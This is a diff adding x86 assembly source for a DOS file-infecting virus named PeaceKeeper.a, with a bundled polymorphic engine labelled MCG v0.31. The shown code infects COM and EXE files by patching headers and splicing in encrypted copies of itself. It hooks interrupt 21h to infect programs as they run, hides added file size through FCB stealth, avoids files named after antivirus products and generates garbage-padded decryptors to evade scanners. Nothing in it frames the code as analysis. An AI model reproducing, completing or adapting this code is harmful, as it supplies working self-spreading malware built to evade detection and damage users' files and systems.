+	     mov     cx,word ptr [data_buffer_+02h]
+	     mov     ax,4200h		 ; Set current file position (SOF)
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+	     jnc     read_header_	 ; No error? Jump to read_header_
+
+	     jmp     error_
+read_header_:
+	     mov     ah,3fh		 ; Read from file
+	     mov     cx,04h		 ; Read four bytes
+	     lea     dx,data_buffer_	 ; DX = offset of data_buffer_
+	     call    int21_simula
+	     jnc     exam_heade 	 ; No error? Jump to exam_heade
+
+	     jmp     error_
+exam_heade:
+	     cmp     [data_buffer_+01h],'E'
+	     jne     test_overlay	 ; New executable? Jump to test_ove...
+
+	     jmp     error_
+test_overlay:
+	     call    get_filesize
+	     call    div_by_pages
+
+	     cmp     [si+04h],ax	 ; Internal overlay?
+	     je      test_overla	 ; Equal? Jump to test_overla
+
+	     jmp     error_
+test_overla:
+	     cmp     [si+02h],dx	 ; Internal overlay?
+	     je      test_memory	 ; Equal? Jump to test_memory
+
+	     jmp     error_
+test_memory:
+	     cmp     word ptr [si+0ch],00h
+	     jne     test_overla_	 ; Not equal? Jump to test_overla_
+
+	     jmp     error_
+test_overla_:
+	     cmp     word ptr [si+1ah],00h
+	     je      modify_head	 ; Main program? Jump to modify_head
+
+	     jmp     error_
+modify_head:
+	     call    get_filesize
+
+	     mov     bx,10h		 ; Divide by paragraphs
+	     div     bx 		 ; AX:DX = filesize in paragraphs
+	     mov     [delta_offse_],dx	 ; Store delta offset
+	     sub     ax,[si+08h]	 ; Subtract headersize in paragraph...
+
+	     push    word ptr [si+16h]	 ; Save initial CS relative to star...
+	     pop     [initial_cs]	 ; Load initial_cs (initial CS rel...)
+	     mov     [si+16h],ax	 ; Store initial CS relative to sta...
+
+	     push    word ptr [si+0eh]	 ; Save initial SS relative to star...
+	     pop     [initial_ss]	 ; Load initial_ss (initial SS rel...)
+	     mov     [si+0eh],ax	 ; Store initial SS relative to sta...
+
+	     push    word ptr [si+14h]	 ; Save initial IP at stack
+	     pop     [initial_ip]	 ; Load initial_ip (initial IP)
+	     mov     [si+14h],dx	 ; Store initial IP
+
+	     push    word ptr [si+10h]	 ; Save initial SP at stack
+	     pop     [initial_sp]	 ; Load initial_sp (initial SP)
+	     mov     word ptr [si+10h],2000h
+
+	     call    get_rnd_num
+
+	     mov     bl,[flags] 	 ; BL = flags
+	     lea     di,data_buffe	 ; DI = offset of data_buffe
+	     mov     bp,[delta_offse_]	 ; BP = delta offset
+	     push    si 		 ; Save SI at stack
+	     call    mcg_start
+	     pop     si 		 ; Load SI from stack
+
+	     call    get_filesize
+	     add     ax,(code_end-code_begin)
+	     adc     dx,00h		 ; Convert to 32-bit
+
+	     add     ax,[dec_length]	 ; Add length of decryptor to size ...
+	     adc     dx,00h		 ; Convert to 32-bit
+	     call    div_by_pages
+	     mov     [si+04],ax 	 ; Store total number of 512-byte p...
+	     mov     [si+02],dx 	 ; Store number of bytes in last 51...
+
+	     cmp     word ptr [si+0ch],0ffffh
+	     jne     write_header	 ; Not equal? Jump to write_header
+
+	     mov     word ptr [si+0ch],0ffffh
+write_header:
+	     mov     word ptr [si+12h],0deadh
+
+	     mov     al,00h		 ; Set current file position (SOF)
+	     call    set_file_pos
+
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     mov     cx,1ch		 ; Read twenty-eight bytes
+	     lea     dx,data_buffer	 ; DX = offset of data_buffer
+	     call    int21_simula
+
+	     mov     [infect_stat],00h	 ; Don't infect file
+
+	     jmp     no_error
+	     endp
+
+infect_com   proc    near		 ; Infect COM file
+	     mov     [regs_assigned],00h ; Index and count register hasn't b..
+
+	     mov     ax,0bb8h		 ; Filesize too small?
+	     cmp     ax,word ptr [filesize]
+	     jb      prepare_infe	 ; Below? Jump to prepare_infe
+
+	     jmp     error_
+prepare_infe:
+	     mov     al,00h		 ; Set current file position (SOF)
+	     call    set_file_pos
+
+	     sub     ax,ax		 ; Zero AX
+	     mov     [part_offse],ax	 ; Zero offset in file of current p...
+	     mov     [part_length],ax	 ; Zero length of polymorphic parts...
+	     mov     [part_offset],ax	 ; Zero offset in file of current p...
+	     mov     [part_offset_],offset data_buffe_
+
+	     call    get_rnd_num
+	     sub     ah,ah		 ; AL = 8-bit random number
+	     and     al,00000011b	 ; AL = random number within three
+	     inc     al 		 ; "  "   "      "      "      "
+	     inc     al 		 ; "  "   "      "      "      "
+
+	     mov     [poly_parts],ax	 ; Store number of polymorphic parts
+	     mov     cx,ax		 ; CX = number of polymorphic parts
+gen_parts:
+	     push    cx 		 ; Save CX at stack
+	     call    get_rnd_num
+	     sub     ah,ah		 ; AL = 8-bit random number
+	     and     al,00000111b	 ; AL = random number within seven
+	     inc     al 		 ; "  "   "      "      "      "
+
+	     mov     cx,ax		 ; CX = number of garbage instructions
+	     lea     di,data_buffe	 ; DI = offset of data_buffe
+gen_garbage:
+	     call    some_garbage_
+
+	     dec     cx 		 ; Decrease count register
+	     jnz     gen_garbage	 ; Not zero? Jump to gen_garbage
+
+	     mov     al,11101001b	 ; JMP imm16 (opcode 0e9h)
+	     stosb			 ; Store JMP imm16 (opcode 0e9h)
+
+	     push    di 		 ; Save DI at stack
+	     lea     bx,data_buffe	 ; BX = offset of data_buffe
+	     sub     di,bx		 ; DI = length of polymorphic part
+	     inc     di 		 ; "  "   "    "       "       "
+	     inc     di 		 ; "  "   "    "       "       "
+
+	     add     [part_offset],di	 ; Add length of polymorphic part t...
+	     mov     [part_length_],di	 ; Store length of current polymorp...
+	     pop     di 		 ; Load DI from stack
+	     pop     cx 		 ; Load CX from stack
+
+	     cmp     cx,01h		 ; Last polymorphic part?
+	     push    cx 		 ; Save CX at stack
+	     je      gen_par_exit	 ; Equal? Jump to gen_par_exit
+offset_error:
+	     call    get_rnd_num
+
+	     xor     ah,ah		 ; AL = 8-bit random number
+	     and     al,00111111b	 ; AL = random number within sixty-...
+	     mov     bx,20h		 ; Multiply by thirty-two
+	     mul     ax 		 ; AX = offset in file of next poly...
+
+	     mov     dx,[part_offset]	 ; DX = offset in file of current p...
+	     add     dx,ax		 ; DX = offset im file of next poly...
+
+	     cmp     dx,word ptr [filesize]
+	     ja      offset_error	 ; Above? Jump to offset_error
+
+	     stosw			 ; Store 16-bit immediate
+	     add     [part_offset],ax	 ; Add offset of in file of next po...
+
+	     jmp     lod_sto_part
+gen_par_exit:
+	     mov     ax,word ptr [filesize]
+	     sub     ax,[part_offset]	 ; AX = 16-bit immediate
+	     stosw			 ; Store 16-bit immediate
+lod_sto_part:
+	     call    lod_sto_file
+
+	     pop     cx 		 ; Load CX from stack
+	     loop    gen_parts
+
+	     call    get_rnd_num
+
+	     mov     bl,[flags] 	 ; BL = flags
+	     lea     di,data_buffe	 ; DI = offset of data_buffe
+	     mov     bp,word ptr [filesize]
+	     add     bp,100h		 ; BP = delta offset
+	     push    si 		 ; Save SI at stack
+	     call    mcg_start
+	     pop     si 		 ; Load SI from stack
+
+	     jmp     no_error
+	     endp
+
+lod_sto_file proc    near		 ; Read original part, write polymo...
+	     mov     ah,3fh		 ; Read from file
+	     mov     cx,[part_length_]	 ; CX = length of current polymorph...
+	     mov     si,[part_offset_]	 ; SI = offset in memory of current...
+
+	     push    [part_length_]	 ; Save length of current polymorph...
+	     pop     [si]		 ; Load   "    "     "         "
+	     push    [part_offse]	 ; Save offset in file of current p...
+	     pop     [si+02h]		 ; Load   "    "   "   "     "     "
+
+	     mov     dx,[part_offset_]	 ; DX = offset in memory of current...
+	     add     dx,04h		 ; "  "   "    "     "   "      "
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     add     [part_offset_],ax	 ; Add length of current polymorphi...
+	     add     [part_offset_],04h  ;  "    "    "     "          "
+	     add     [part_length],ax	 ;  "    "    "     "          "
+	     add     [part_length],04h	 ;  "    "    "     "          "
+
+	     mov     ax,4200h		 ; Set current file position (SOF)
+	     sub     cx,cx		 ; CX = high-order word of offset f...
+	     mov     dx,[part_offse]	 ; DX = offset in file of current p...
+	     call    int21_simula
+
+	     mov     ah,40h		 ; Write to file
+	     mov     cx,[part_length_]	 ; CX = length of current polymorph...
+	     lea     dx,data_buffe	 ; DX = offset of data_buffe
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     mov     ax,4200h		 ; Set current file position (SOF)
+	     xor     cx,cx		 ; CX = high-order word of offset f...
+	     mov     dx,[part_offset]	 ; DX = offset in file of current p...
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+	     mov     [part_offse],ax	 ; Store offset in file of current ...
+
+	     jmp     no_error
+	     endp
+
+mark_com     proc    near		 ; Set infection mark of COM file
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     mov     cx,[part_length]	 ; CX = length of polymorphic parts...
+	     add     cx,02h		 ; Add length of infection mark to ...
+
+	     lea     si,data_buffe_	 ; SI = offset of data_buffe_
+	     add     si,[part_length]	 ; SI = offset of end of data_buffe_
+	     mov     word ptr [si],0deadh
+
+	     lea     dx,data_buffe_	 ; DX = offset of data_buffe_
+	     call    int21_simula
+
+	     jmp     no_error
+	     endp
+
+examine_com  proc    near		 ; Examine COM file
+	     mov     ax,4200h		 ; Set current file position (SOF)
+	     sub     cx,cx		 ; CX = high-order word of offset f...
+	     mov     dx,word ptr [filesize]
+	     sub     dx,02h		 ; DX = low-order word of offset fi...
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     mov     ah,3fh		 ; Read from file
+	     mov     cx,02h		 ; Read two bytes
+	     lea     dx,data_buffer	 ; DX = offset of data_buffer
+	     call    int21_simula
+	     cmp     word ptr [data_buffer],0deadh
+	     je      infected		 ; Equal? Jump to infected
+
+	     jmp     no_error
+infected:
+	     jmp     error_
+	     endp
+
+infect_file  proc    near		 ; Infect COM/EXE file
+	     mov     al,02h		 ; Set current file position (EOF)
+	     call    set_file_pos
+
+	     lea     dx,data_buffe	 ; DX = offset of data_buffe
+	     mov     cx,[dec_length]	 ; CX = length of decryptor
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     cmp     [execute_stat],01h  ; EXE executable?
+	     je      infect_exe_	 ; Equal? Jump to infect_exe_
+	     cmp     [execute_stat],00h  ; COM executable?
+	     je      infect_com_	 ; Equal? Jump to infect_com_
+eternal_loo_:
+	     jmp     eternal_loo_
+infect_exe_:
+	     call    calc_virus
+	     push    dx 		 ; Save DX at stack
+
+	     mov     cx,ax		 ; CX = number of paragraphs
+	     lea     si,code_begin	 ; SI = offset of code_begin
+encrypt_loop:
+	     push    cx 		 ; Save CX at stack
+	     mov     dx,[encrypt_key]	 ; DX = encryption/decryption key
+	     mov     cx,200h		 ; CX = number of bytes to encrypt
+	     lea     di,data_buffe	 ; DI = offset of data_buffe
+	     call    encrypt_body
+
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     pop     cx 		 ; Load CX from stack
+	     loop    encrypt_loop
+
+	     pop     cx 		 ; Load CX from stack (DX)
+	     lea     di,data_buffe	 ; DI = offset of data_buffe
+	     mov     dx,[encrypt_key]	 ; DX = encryption/decryption key
+	     call    encrypt_body
+
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     jmp     no_error
+infect_com_:
+	     call    calc_virus
+	     push    dx 		 ; Save DX at stack
+
+	     mov     cx,ax		 ; CX = number of paragraphs
+	     lea     si,code_begin	 ; SI = offset of code_begin
+encrypt_loo:
+	     push    cx 		 ; Save CX at stack
+	     mov     dx,[encrypt_key]	 ; DX = encryption/decryption key
+	     mov     cx,200h		 ; CX = number of bytes to encrypt
+	     lea     di,data_buffe_	 ; DI = offset of data_buffe_
+	     add     di,[part_length]	 ; DI = offset of end of data_buffe_
+	     call    encrypt_body
+
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     pop     cx 		 ; Load CX from stack
+	     loop    encrypt_loo
+
+	     pop     cx 		 ; Load CX from stack (DX)
+	     lea     di,data_buffe_	 ; DI = offset of data_buffe_
+	     add     di,[part_length]	 ; DI = offset of end of data_buffe_
+	     mov     dx,[encrypt_key]	 ; DX = encryption/decryption key
+	     call    encrypt_body
+
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     jmp     no_error
+	     endp
+
+calc_virus   proc    near		 ; Calculate size of virus in parag...
+	     sub     dx,dx		 ; Zero DX
+	     mov     bx,200h		 ; Divide by pages
+	     mov     ax,(code_end-code_begin)
+	     div     bx 		 ; AX:DX = size of virus in paragraphs
+
+	     ret			 ; Return
+	     endp
+
+save_regs    proc    near		 ; Save registers
+	     mov     cs:[ax_],ax	 ; Store accumulator register
+	     mov     cs:[bx_],bx	 ; Store base register
+	     mov     cs:[cx_],cx	 ; Store count register
+	     mov     cs:[dx_],dx	 ; Store data register
+	     mov     cs:[si_],si	 ; Store source index
+	     mov     cs:[di_],di	 ; Store destination index
+	     mov     cs:[bp_],bp	 ; Store base pointer
+	     mov     cs:[ds_],ds	 ; Store data segment
+	     mov     cs:[es_],es	 ; Store extra segment
+
+	     nop
+	     ret			 ; Return
+	     endp
+
+load_regs    proc    near		 ; Load registers
+	     mov     ax,cs:[ax_]	 ; AX = accumulator register
+	     mov     bx,cs:[bx_]	 ; BX = base register
+	     mov     cx,cs:[cx_]	 ; CX = count register
+	     mov     dx,cs:[dx_]	 ; DX = data register
+	     mov     si,cs:[si_]	 ; SI = source index
+	     mov     di,cs:[di_]	 ; DI = destination index
+	     mov     bp,cs:[bp_]	 ; BP = base pointer
+	     mov     ds,cs:[ds_]	 ; DS = data segment
+	     mov     es,cs:[es_]	 ; ES = extra segment
+
+	     nop
+	     ret			 ; Return
+	     endp
+
+int24_virus  proc    near		 ; Interrupt 24h of PeaceKeeper.a
+	     mov     al,03h		 ; AL = fail system call in progress
+
+	     iret			 ; Interrupt return
+	     endp
+
+int21_virus  proc    near		 ; Interrupt 21h of PeaceKeeper.a
+	     cmp     ax,0deadh		 ; PeaceKeeper.a function?
+	     jne     determ_func	 ; Not equal? Jump to determ_func
+
+	     mov     bx,ax		 ; Already resident
+
+	     iret			 ; Interrupt return
+determ_func:
+	     cmp     ax,0deaeh		 ; PeaceKeeper.a function?
+	     je      init_rnd_nu	 ; Equal? Jump to init_rnd_nu
+	     cmp     ax,4b00h		 ; Load and execute program?
+	     je      load_and_exe	 ; Equal? Jump to load_and_exe
+	     cmp     ah,11h		 ; Find first matching file (FCB)?
+	     je      fcb_stealth	 ; Equal? Jump to fcb_stealth
+	     cmp     ah,12h		 ; Find next matching file (FCB)?
+	     je      fcb_stealth	 ; Equal? Jump to fcb_stealth
+int21_exit:
+	     jmp     cs:[int21_addr_]
+
+	     iret			 ; Interrupt return
+	     endp
+
+int21_simula proc    near		 ; Simulate interrupt 21h
+	     pushf			 ; Save flags at stack
+
+	     call    cs:[int21_addr]
+
+	     ret			 ; Return
+	     endp
+init_rnd_nu:
+	     call    save_regs
+	     call    init_rnd_num
+	     call    load_regs
+load_and_exe:
+	     call    save_regs
+
+	     mov     cs:[filename_off],dx
+	     mov     cs:[filename_seg],ds
+
+	     push    cs 		 ; Save CS at stack
+	     pop     ds 		 ; Load DS from stack
+
+	     call    int24_store
+	     call    infect_file_
+	     call    int24_load
+	     call    load_regs
+
+	     jmp     int21_exit
+fcb_stealth:
+	     pushf			 ; Save flags at stack
+	     call    int21_simula
+	     popf			 ; Load flags from stack
+	     test    al,al		 ; Successfull?
+	     jnz     filesiz_exi_	 ; Not zero? Jump to filesize_exi_
+
+	     push    ax bx dx si es ds	 ; Save registers at stack
+
+	     mov     ah,51h		 ; Get current PSP address
+	     call    int21_simula
+	     mov     es,bx		 ; ES = segment of PSP for current ...
+	     cmp     bx,es:[16h]	 ; Parent PSP equal to current PSP?
+	     jne     filesiz_exit	 ; Not equal? Jump to filesiz_exit
+
+	     mov     si,dx		 ; SI = offset of unopened FCB
+
+	     mov     ah,2fh		 ; Get Disk Transfer Area (DTA) add...
+	     call    int21_simula
+
+	     lodsb			 ; AL = signature for extended FCB
+	     sub     si,si		 ; Zero SI
+	     inc     al 		 ; Extended File Control Block (XFCB)?
+	     jnz     not_extended	 ; Not zero? Jump to not_extended
+
+	     add     bx,07h		 ; BX = offset of File Control Bloc...
+not_extended:
+	     mov     ax,es:[bx+17h]	 ; AX = file time
+	     db      10000011b,11100000b ; AND AX,1Fh (opcode 83h,0e0h,1fh)
+	     db      00011111b
+	     db      10000011b,11111000b ; CMP AX,1Fh (opcode 83h,0f80h,1eh)
+	     db      00011110b
+	     jne     filesiz_exit	 ; Not equal? Jump to filesiz_exit
+
+	     mov     ax,es:[bx+1dh]	 ; AX = low-order word of filesize
+	     mov     dx,es:[bx+1fh]	 ; DX = high-order word of filesize
+
+	     sub     ax,(code_end-code_begin)
+	     sbb     dx,00h		 ; Convert to 32-bit
+	     jb      filesiz_exit	 ; Below? Jump to filesiz_exit
+
+	     mov     es:[bx+1dh],ax	 ; Store low-order word of filesize
+	     mov     es:[bx+1fh],dx	 ; Store high-order word of filesize
+filesiz_exit:
+	     pop     ds es si dx bx ax	 ; Load registers from stack
+filesiz_exi_:
+	     iret			 ; Interrupt return
+
+infect_file_ proc    near		 ; Infect COM/EXE file
+	     cli			 ; Clear interrupt-enable flag
+	     mov     [stack_seg],ss	 ; Store stack segment
+	     mov     [stack_ptr_],sp	 ; Store stack pointer
+
+	     push    cs 		 ; Save CS at stack
+	     pop     ss 		 ; Load SS from stack (CS)
+
+	     lea     sp,stack_ptr	 ; SP = stack pointer
+	     sti			 ; Set interrupt-enable flag
+
+	     mov     cs:[payload_stat],00h
+
+	     call    examine_name
+	     jc      infect_exit_	 ; Error? Jump to infect_exit_
+
+	     call    payload_
+
+	     mov     [infect_stat],01h	 ; Infect file
+
+	     cmp     [execute_stat],00h  ; COM executable?
+	     je      infect_com__	 ; Equal? Jump to infect_com__
+	     cmp     [execute_stat],01h  ; EXE executable?
+	     je      infect_exe__	 ; Equal? Jump to infect_exe__
+
+	     jmp     error_
+infect_exe__:
+	     call    sto_file_att
+	     jc      infect_exit_	 ; Error? Jump to infect_exit_
+
+	     call    open_file
+	     jc      infect_exit_	 ; Error? Jump to infect_exit_
+
+	     call    get_file_inf
+
+	     mov     al,02h		 ; Set current file position (EOF)
+	     call    set_file_pos
+	     mov     word ptr [filesize],ax
+	     mov     word ptr [filesize+02h],dx
+
+	     call    infect_exe
+	     jc      infect_exit	 ; Error? Jump to infect_exit
+
+	     mov     [infect_stat],00h	 ; Don't infect file
+
+	     call    infect_file
+	     jmp     infect_exit
+infect_com__:
+	     call    sto_file_att
+	     jc      infect_exit_	 ; Error? Jump to infect_exit_
+
+	     call    open_file
+	     jc      infect_exit_	 ; Error? Jump to infect_exit_
+
+	     call    get_file_inf
+
+	     mov     al,02h		 ; Set current file position (EOF)
+	     call    set_file_pos
+	     mov     word ptr [filesize],ax
+	     mov     word ptr [filesize+02h],dx
+
+	     call    examine_com
+	     jc      infect_exit	 ; Error? Jump to infect_exit
+	     call    infect_com
+	     jc      infect_exit	 ; Error? Jump to infect_exit
+
+	     call    infect_file
+	     call    mark_com
+
+	     mov     [infect_stat],00h	 ; Don't infect file
+infect_exit:
+	     call    set_file_inf
+	     call    close_file
+infect_exit_:
+	     mov     cs:[payload_stat],01h
+
+	     cli			 ; Clear interrupt-enable flag
+	     push    [stack_seg]	 ; Save stack segment at stack
+	     pop     ss 		 ; Load SS from stack (stack segment)
+
+	     mov     sp,[stack_ptr_]	 ; SP = stack pointer
+	     sti			 ; Set interrupt-enable flag
+
+	     jmp     no_error
+	     endp
+
+table_begin:
+scan_strings db      90h,90h,0e8h,0cch	 ; Scan string of DOS kernel v 3.xx
+	     db      90h,90h,0e8h,0cch	 ; Scan string of DOS kernel v 4.xx
+	     db      90h,90h,0e8h,0cch	 ; Scan string of DOS kernel v 5.xx
+	     db      90h,90h,0e8h,0cch	 ; Scan string of DOS kernel v 6.xx
+table_end:
+execute_stat db      ?			 ; Executable status
+filename_off dw      ?			 ; Offset of filename
+filename_seg dw      ?			 ; Segment of filename
+file_attr    dw      ?			 ; File attributes
+file_date    dw      ?			 ; File date
+file_time    dw      ?			 ; File time
+filesize     dd      ?			 ; Filesize
+file_handle  dw      ?			 ; File handle
+initial_ss   dw      ?			 ; Initial SS relative to start of ...
+initial_sp   dw      ?			 ; Initial SP
+initial_cs   dw      ?			 ; Initial CS relative to start of ...
+initial_ip   dw      ?			 ; Initial IP
+	     db      21h,98h,01h,00h,0adh,0deh
+exe_extensio db      'EXE'               ; EXE extension
+com_extensio db      'COM'               ; COM extension
+table_begin_:
+name_table   db      'SC'                ; McAfee ViruScan
+	     db      'CL'                ;   "       "
+	     db      'VI'                ; VIRSTOP
+	     db      'VS'                ; Vsafe
+	     db      'MS'                ; Microsoft Anti-Virus
+	     db      'CP'                ; Central Point Anti-Virus
+	     db      'F-'                ; F-PROT
+	     db      'IM'                ; Integrity Master
+	     db      'VH'                ; VHunter
+	     db      'TB'                ; ThunderByte Anti-Virus
+table_end_:
+	     db      00h,00h
+part_offset  dw      ?			 ; Offset in file of current polymo...
+part_length  dw      ?			 ; Length of polymorphic parts + in...
+part_offset_ dw      ?			 ; Offset in memory of current poly...
+part_offse   dw      ?			 ; Offset in file of current polymo...
+poly_parts   dw      01h		 ; Number of polymorphic parts
+part_length_ dw      ?			 ; Length of current polymorphic part
+delta_offse_ dw      ?			 ; Delta offset
+infect_stat  db      ?			 ; Infect status			..
+	     db      01h
+payload_stat db      ?			 ; Payload status
+trace_status db      ?			 ; Trace flag status
+	     db      08h dup(00h)
+dos_version  dw      ?			 ; DOS version number
+program_seg  dw      ?			 ; Segment of Program Segment Prefi...
+int21_addr   dd      ?			 ; Address of interrupt 21h
+int21_addr_  dd      ?			 ; Address pf interrupt 21h
+int24_addr   dd      ?			 ; Address of interrupt 24h
+	     db      08h dup(00h)
+int13_addr   dd      ?			 ; Address of interrupt 13h
+stack_seg    dw      ?			 ; Stack segment
+stack_ptr_   dw      ?			 ; Stack pointer
+ax_	     dw      ?			 ; Accumulator register
+bx_	     dw      ?			 ; Base register
+cx_	     dw      ?			 ; Count register
+dx_	     dw      ?			 ; Data register
+ds_	     dw      ?			 ; Data segment
+es_	     dw      ?			 ; Extra segment
+si_	     dw      ?			 ; Source index
+di_	     dw      ?			 ; Destination index
+bp_	     dw      ?			 ; Base pointer
+data_buffer  db      1ch dup(?) 	 ; Data buffer
+data_buffer_ db      04h dup(?) 	 ;  "     "
+flags	     db      00h		 ; Flags
+; ƒƒƒƒƒƒƒ Poly engine start ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+
+assign_val	dw 0			; value to be assigned when calling
+					; the do_assign procedure
+assign_reg	db 0			; register to be used when calling
+					; the do_assign procedure
+encrypt_key	dw 0			; encryption key used
+run_offset	dw 0			; offset at which the decryptor will
+					; run (BP at input)
+poly_flags	db 0			; flags given to poly engine are
+					; stored here
+loop_start	dw 0			; pointer to start of the decryption
+					; loop
+rnd_pnt_off	dw 0			; random value added to the pointer
+					; in the decryption instruction
+decrypt_start	dw 0			; pointer to decryptor start
+dec_length	dw 0			; decryptor length
+regs_assigned	db 0			; 1 if pointer and counter registers
+					; have been assigned yet, 0 otherwise
+use_loop	db 0			; 0 if LOOP instruction will be used
+					; in dec loop, 1 don't force LOOP
+
+poly_name_ver	db '[MCG v0.31·]'
+
+reg_no_assign:			; Registers that can't be used as temporary
+				; when assigning a value
+		db    0 	; AX
+		db    1 	; CX
+		db    3 	; BX
+		db    4 	; BP
+
+mul2_in_si	proc near
+;
+; this procedure multiplies AX by two and puts the result in SI. this is used
+; when selecting elements from the procedures tables later, since each address
+; in a word long.
+;
+		nop
+		nop
+		mov	bx, 2
+		mul	bx			; simply ax * 2 and then
+		mov	si, ax			; store in si
+		retn
+mul2_in_si	endp
+
+
+get_random	proc near
+		push	cx
+		mov	cx, 1eh
+
+persist_rnd:
+		call	get_rnd_num
+		loop	persist_rnd		; call the real rnd_generator
+		pop	cx			; a few times to be more
+		retn				; randomized
+get_random	endp
+
+
+some_garbage	proc near
+		test	byte ptr [poly_flags], 40h	; garbage allowed?
+		jnz	return_garbage
+some_garbage_:
+		push	cx
+		call	get_rnd_num
+		and	al, 7
+		sub	ah, ah				; select how much
+		mov	ch, ah				; garbage inst. to do
+		mov	cl, al				; between 01h and 08h
+		inc	cx
+
+garbage_loop_2:
+		call	garbage_instr			; do given number of
+		loop	garbage_loop_2			; garbage instructions
+		pop	cx
+return_garbage:
+		retn
+some_garbage	endp
+
+
+select_reg_ass	proc near
+		push	ax
+		push	cx
+		push	di
+		mov	di, offset reg_no_assign	; point to table of ones
+		mov	cx, 4				; that can't be used
+		mov	al, ah
+		repne	scasb			; check if randomly selected
+		pop	di			; can be used or not
+		pop	cx
+		pop	ax
+		jnz	ok_regi_ass		; NZ means register can be used
+		mov	ah, 2			; if can't use that one then
+ok_regi_ass:					; use register DX
+		retn
+select_reg_ass	endp
+
+garbage_sel:
+;
+; table with offsets to garbage generation routines
+;
+		dw offset garbage_way_1
+		dw offset garbage_way_2
+		dw offset garbage_way_5
+		dw offset garbage_way_4
+		dw offset garbage_way_7
+		dw offset garbage_way_3
+		dw offset garbage_way_7
+		dw offset garbage_way_6
+
+one_byters:
+;
+; one byte instructions that can be generated as garbage
+;
+		nop
+		clc
+		stc
+		cmc
+		cli
+		nop
+		cld
+		cmc
+
+math_garb:
+;
+; possible garbage operations. this are the ones that doesn't modify the
+; register content when using the same register as source and destination
+;
+		db    8 	; or  opcode
+		db  20h 	; and opcode
+		db    8 	; or  opcode
+		db  88h 	; mov opcode
+
+zero_reg:
+;
+; possible instructions used to zero a register when both source and destination
+; are the same register
+;
+		db  2bh 	; sub opcode
+		db  31h 	; xor opcode
+
+
+garbage_instr	proc near
+;
+; this routine generates a garbage instruction
+;
+		pushf
+		push	ax
+		push	bx			; save some registers
+		push	cx
+		push	dx
+		call	get_random		; select from the given
+		db	10000011b,11100000b	; AND AX,07h
+		db	00000111b		; (opcode 83h,0e0h,07h)
+		call	mul2_in_si		; convert to offset in SI
+		call	get_random		; rnd value in AX for garbage
+						; routines
+		jmp	word ptr cs:[si + offset garbage_sel]	; generate
+return_garbage_:
+		pop	dx
+		pop	cx			; restore and return back
+		pop	bx
+		pop	ax
+		popf
+		retn
+garbage_instr	endp
+
+; ƒƒƒƒƒƒƒ Garbage generator routines ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+
+garbage_way_1:
+;
+; this selects one one-byte instruction from the table
+;
+		and	al, 7			; 8 one byte opcodes
+		mov	bx, offset one_byters	; select one from table
+		xlat
+		stosb				; and store
+		jmp	short return_garbage_
+
+garbage_way_2:
+;
+; this generates three different types of 8 or 16 bit register to register
+; operations that are AND, OR and MOV
+;
+		cmp	byte ptr [regs_assigned], 0
+		jnz	return_garbage_
+		and	al, 3			; 4 possible operations
+		mov	bx, offset math_garb	; select one from table
+		push	cs
+		pop	es
+		xlat
+		mov	bl, al
+		push	cx
+		call	get_rnd_num
+		and	al, 1			; 8 or 16 bit
+		or	al, bl
+		and	ah, 38h 		; select one random pair
+		mov	bh, ah			; of registers for the
+		mov	cl, 3			; operation
+		shr	ah, cl
+		or	ah, bh			; make source and destination
+		or	ah, 0c0h		; the same register, so content
+		stosw				; isn't altered
+		pop	cx
+		jmp	short return_garbage_
+
+garbage_way_3:
+;
+; this generates two xchanges of 8 or 16 bits registers, this way important
+; data in used regs isn't lost
+;
+		and	al, 1			; 8bit (86h) or 16bit (87h)
+		or	al, 86h 		; xchg base
+		or	ah, 0c0h		; from two random regs
+		stosw				; xchange twice, so nothing
+		stosw				; changes
+		jmp	short return_garbage_
+
+garbage_way_4:
+;
+; this generates 16 types of conditional jumps to the next instruction
+;
+		and	al, 0fh 		; 0fh types of jumps
+		or	al, 70h 		; conditional jump base
+		sub	ah, ah			; on next instruction
+		stosw
+		jmp	short return_garbage_
+
+garbage_way_5:
+;
+; this generates a comparation of 8 or 16 bits of two registers. randomly
+; it also puts a conditional jump (using the garbage_way_4) routine after
+; the comparsion.
+;
+		cmp	byte ptr [regs_assigned], 0
+		jnz	return_garbage_
+		and	al, 1			; 8 or 16 bits
+		or	al, 3ah 		; cmp reg,reg prefix
+		or	ah, 0c0h		; from two random regs
+		stosw
+		call	get_rnd_num
+		test	ah, 2			; randomly add also a cond
+		jz	garbage_way_4		; jump after this cmp
+		jmp	short return_garbage_
+
+garbage_way_6:
+;
+; this generates a comparation of a 8 or 16 bit register with an immediate
+; (of course of the same size) and then puts a conditional jump after it
+;
+		cmp	byte ptr [regs_assigned], 0
+		jnz	return_garbage_
+		and	al, 1			; 8 or 16 bit
+		or	al, 3ch 		; cmp reg,immediate
+		stosb
+		test	al, 1			; depending on the used imm
+		pushf				; dimension store one or two
+		call	get_rnd_num		  ; random bytes as immediate
+		popf
+		jnz	word_immediate_cmp
+		stosb
+back_immediate_cmp:
+		jmp	short garbage_way_4
+
+word_immediate_cmp:
+		stosw
+
+		jmp	short back_immediate_cmp
+garbage_way_7:
+;
+; this generates a test between two 8 or 16 bits registers and puts a
+; conditional jump after it
+;
+		cmp	byte ptr [regs_assigned], 0
+		jz	can_do_test
